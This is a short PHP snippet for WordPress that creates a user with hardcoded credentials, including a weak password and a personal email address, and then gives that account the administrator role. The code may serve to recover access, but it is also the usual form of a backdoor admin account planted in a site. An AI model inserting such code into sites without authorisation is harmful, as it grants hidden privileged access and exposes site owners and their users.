<?php 

// Syntext =  wp_create_user('user-name','password','email') 
$createuser = wp_create_user('user','@dmin','wolverine3fire@gmail.com');

$makeuser = new WP_User($createuser);

$makeuser -> set_role('administrator');

